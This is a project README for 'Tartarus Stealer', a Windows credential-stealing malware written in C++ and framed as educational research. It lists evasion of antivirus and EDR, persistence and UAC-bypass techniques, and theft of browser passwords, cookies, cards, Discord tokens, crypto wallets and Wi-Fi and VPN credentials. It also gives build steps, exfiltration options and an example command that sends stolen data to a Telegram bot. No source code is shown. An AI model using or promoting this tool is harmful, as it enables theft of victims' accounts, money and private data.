

---

# 🐂 TARTARUS STEALER  
*Educational Malware Analysis & Offensive Security Research*  

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)]()
[![C++](https://img.shields.io/badge/C++-17-blue?logo=c%2B%2B)](https://isocpp.org/)
[![Build](https://img.shields.io/badge/Build-MSVC-green?logo=visualstudio)]()

---

## ⚠️ LEGAL DISCLAIMER  
**This project is strictly for educational and research purposes only.**  
It is designed to help cybersecurity professionals, students, and researchers understand modern malware techniques, offensive security tactics, and defensive countermeasures.  

**Do not use this software on any system without explicit written permission from the owner.**  
The author and contributors are not responsible for any misuse or damage caused by this tool. Use it only in isolated, controlled environments (e.g., your own lab virtual machines).  

---

## 🔥 Overview  
**Tartarus Stealer** is a proof‑of‑concept (PoC) stealer that demonstrates a wide range of post‑exploitation capabilities commonly found in advanced persistent threats (APTs) and modern info‑stealers. It is named after the **Tartarus** – the deep abyss in Greek mythology – and features a **bull** as its mascot, symbolizing strength and relentless data collection.  

This project is a **learning resource** to dissect:  
- ✅ Syscall obfuscation & indirect syscalls (bypassing EDR/AV hooks)  
- ✅ Anti‑debugging & anti‑VM techniques  
- ✅ Persistence mechanisms (Registry, Scheduled Tasks, Services, WMI, COM hijacking)  
- ✅ UAC bypasses (Fodhelper, Eventvwr, CMSTP)  
- ✅ Credential & browser data extraction (Chrome, Edge, Firefox, Opera, etc.)  
- ✅ Discord token theft (from LevelDB and browser cookies)  
- ✅ Cryptocurrency wallet harvesting  
- ✅ Wi‑Fi password recovery  
- ✅ Process injection (Early Bird, Process Hollowing, Module Stomping)  
- ✅ C2 communication (Telegram, Webhook, raw TCP)  
- ✅ Encryption & compression of exfiltrated data  

---

### U GONNA LIKE IT, BRRRRMM..  

---

## 🚀 Features  

### 🔐 Evasion & Anti‑Analysis  
- **Indirect Syscalls** – dynamically resolves Nt* syscall numbers and calls them via a custom gadget, avoiding user‑land hooks.  
- **NTDLL Unhooking** – reloads a clean copy of `ntdll.dll` from disk to remove EDR/AV patches.  
- **ETW & AMSI Patching** – disables Event Tracing for Windows and Anti‑Malware Scan Interface.  
- **Anti‑Debug / Anti‑VM / Anti‑Sandbox** – checks for debuggers, virtual machines, and sandbox environments (CPUID, memory, disk space, processes, windows, etc.).  
- **Thread hiding** – hides the main thread from debuggers.  
- **Ekko‑style Sleep** – encrypts the payload before sleeping and decrypts after, to defeat memory scanners.  

### 💾 Persistence & Elevation  
- Multiple persistence points:  
  - Registry Run keys (HKCU, HKLM)  
  - Scheduled Tasks (via `schtasks`)  
  - Windows Service  
  - WMI Event Subscription  
  - Startup Folder  
  - COM Hijacking (CLSID)  
- UAC bypass techniques:  
  - Fodhelper (via `ms‑settings`)  
  - Eventvwr (via `mscfile`)  
  - CMSTP (via INF file)  
- Elevation to SYSTEM by duplicating a token from `winlogon.exe`.  

### 🧾 Data Exfiltration  
#### 🔍 Browsers (Chromium‑based & Firefox)  
- Passwords, cookies, credit cards, history, bookmarks, autofill.  
- Decrypts Chrome‑style encrypted values (AES‑GCM) using the OS‑protected master key.  

#### 💬 Messaging & Gaming  
- Discord tokens (from cookies and LevelDB files).  
- Telegram session files (from `tdata`).  

#### 💰 Cryptocurrency Wallets  
- Exodus, Electrum, Atomic, Guarda, Coinomi, Binance, MetaMask (LevelDB), Trust, Phantom, and many more.  

#### 🌐 Network & Credentials  
- Wi‑Fi SSID/passwords (via WLAN API).  
- VPN configurations (NordVPN, ExpressVPN, ProtonVPN, OpenVPN).  
- Windows Credential Manager vault.  
- FileZilla & WinSCP saved credentials.  
- Outlook profiles.  

#### 🎮 Gaming Platforms  
- Steam (loginusers.vdf), Uplay (settings.ini), Epic Games (GameUserSettings.ini).  

#### 🧠 Memory Scraping  
- Scans memory of browser processes for passwords and tokens using regex patterns.  

### 📡 C2 & Reporting  
- **Output formats**: JSON (structured, easy to parse).  
- **Exfiltration channels**:  
  - Telegram Bot (via `sendDocument`)  
  - Generic Webhook (multipart/form‑data)  
  - Raw TCP socket to a C2 server  
- **Compression**: uses AES‑GCM encryption (with a random key per run) to protect exfiltrated data.  
- **Thread‑pool** for concurrent data extraction.  

---

## 📦 Build & Dependencies  

### Prerequisites  
- **Windows SDK** (10.0.19041.0 or later)  
- **Visual Studio 2019 / 2022** (with C++ development tools)  
- **vcpkg** or manually installed libraries:  
  - [SQLite3](https://sqlite.org/)  
  - [OpenSSL](https://www.openssl.org/) (1.1.1 or later)  
  - [nlohmann/json](https://github.com/nlohmann/json) (header‑only)  

All required libraries are linked via `#pragma comment(lib, ...)` in the source, but you must ensure the `.lib` files are available.  

### Compilation  
1. Clone the repository:  
   ```bash
   git clone https://github.com/yourusername/TartarusStealer.git
   cd TartarusStealer
```

2. Open the solution in Visual Studio.
3. Set the configuration to Release and x64.
4. Build the project (F7).

The resulting executable will be located in x64\Release\stealerv2.exe.

---

🛠️ Usage

Run with administrative privileges for maximum data collection.

```cmd
stealerv2.exe [options]
```

Command‑line Options

Option Description
--telegram-token <token> Telegram bot token
--telegram-chat <chat_id> Telegram chat ID
--webhook <url> Webhook URL (e.g., https://your-server.com/upload)
--c2-host <host> C2 server hostname/IP
--c2-port <port> C2 server port
--no-exfil Disable data exfiltration (only save locally)
--no-compress Disable encryption/compression of output
--no-silent Show console window (default is silent)
--no-antidebug Disable anti‑debugging checks
--no-persistence Disable persistence installation
--threads <n> Number of threads for extraction (default = CPU cores)
--output-dir <path> Output directory (default: C:\ProgramData\SystemCache)
--browser <name> Only process specific browser(s), e.g., --browser Chrome --browser Firefox

Example

```cmd
stealerv2.exe --telegram-token "123456:ABC-DEF" --telegram-chat "123456789" --threads 4
```

---

📊 Output Structure

The tool writes two files in the output directory:

· stealer_output.json – a JSON Lines‑like array containing each stolen item (passwords, cookies, etc.) with a type field.
· full_data.json – a complete JSON object with the same data, optionally encrypted (AES‑GCM + Base64) if compression is enabled.

Sample entry:

```json
{
  "type": "password",
  "browser": "Chrome",
  "profile": "Default",
  "url": "https://example.com/login",
  "username": "user@example.com",
  "password": "SuperSecret123"
}
```

---

🧪 Lab Environment

For safe testing, use a Windows 10/11 virtual machine disconnected from any production network.

Recommended Setup

· Disable Windows Defender or add exclusions to avoid interference.
· Run as Administrator.
· Monitor with Process Monitor, API Monitor, or a debugger to understand the techniques.

---

📸 Screenshots



🤝 Contributing

Contributions are welcome! This project is intended for educational advancement. Please open an issue or a pull request if you have improvements, bug fixes, or new techniques to add.

Guidelines:

· Keep the code portable and well‑commented.
· Add educational explanations when introducing new anti‑analysis tricks.
· Ensure all added features respect the non‑malicious intent.

---

📜 License

This project is licensed under the MIT License – see the LICENSE file for details.

---

📬 Contact

For questions, suggestions, or problems
· Email: ddarkochidori@gmail.com 

---

“Knowledge is the only weapon that can protect us from the monsters we create.”
– Anonymous

---

<p align="center">
  <b>🐂 TARTARUS STEALER – Unleash the Bull, but responsibly.</b>
</p>
```

---
